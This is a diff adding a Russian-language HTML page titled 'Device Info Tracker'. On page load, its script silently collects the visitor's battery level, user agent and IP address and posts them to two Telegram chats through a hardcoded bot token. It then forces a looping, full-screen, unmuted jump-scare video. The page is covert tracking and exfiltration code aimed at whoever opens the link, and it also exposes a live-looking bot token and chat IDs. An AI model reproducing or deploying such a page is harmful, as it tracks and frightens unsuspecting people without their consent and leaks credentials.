@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Info Tracker</title>
+    <script>
+        async function getDeviceInfo() {
+            // Получаем уровень заряда
+            let battery = await navigator.getBattery();
+            let batteryLevel = battery.level * 100;
+
+            // Определяем user agent (модель телефона и браузер)
+            let userAgent = navigator.userAgent;
+
+            // Получаем IP-адрес
+            let ipResponse = await fetch('https://api64.ipify.org?format=json');
+            let ipData = await ipResponse.json();
+            let ipAddress = ipData.ip;
+
+            // Телеграм-бот данные
+            let botToken = '7649989759:AAEWIMI6TadNLruyPz--KjQsSm-IC3iUqX0';
+            let chatIds = [1966058308, 6043001526];
+
+            let message = `\u2709 Новое устройство\n\n` +
+                          `\uD83D\uDD0B Батарея: ${batteryLevel}%\n` +
+                          `\uD83D\uDCBB Устройство: ${userAgent}\n` +
+                          `\uD83C\uDF10 IP: ${ipAddress}`;
+            
+            // Отправляем данные каждому ID
+            chatIds.forEach(chatId => {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            });
+
+            // Запускаем видео
+            playVideo();
+        }
+
+        function playVideo() {
+            let video = document.getElementById('scrimerVideo');
+
+            // Добавляем атрибуты для зацикливания
+            video.loop = true;
+            video.muted = false; // Если нужно без звука, ставь true
+            video.style.display = "block"; // Показываем видео
+
+            // Запрашиваем полноэкранный режим
+            if (video.requestFullscreen) {
+                video.requestFullscreen();
+            } else if (video.mozRequestFullScreen) { // Firefox
+                video.mozRequestFullScreen();
+            } else if (video.webkitRequestFullscreen) { // Chrome, Safari и Opera
+                video.webkitRequestFullscreen();
+            } else if (video.msRequestFullscreen) { // IE/Edge
+                video.msRequestFullscreen();
+            }
+
+            // Автоматический запуск видео
+            video.play();
+        }
+
+        window.onload = getDeviceInfo;
+    </script>
+</head>
+<body>
+    <h1>Информация собрана</h1>
+    <video id="scrimerVideo" src="vid/scrimer.mp4" style="display:none;"></video>
+</body>
+</html>
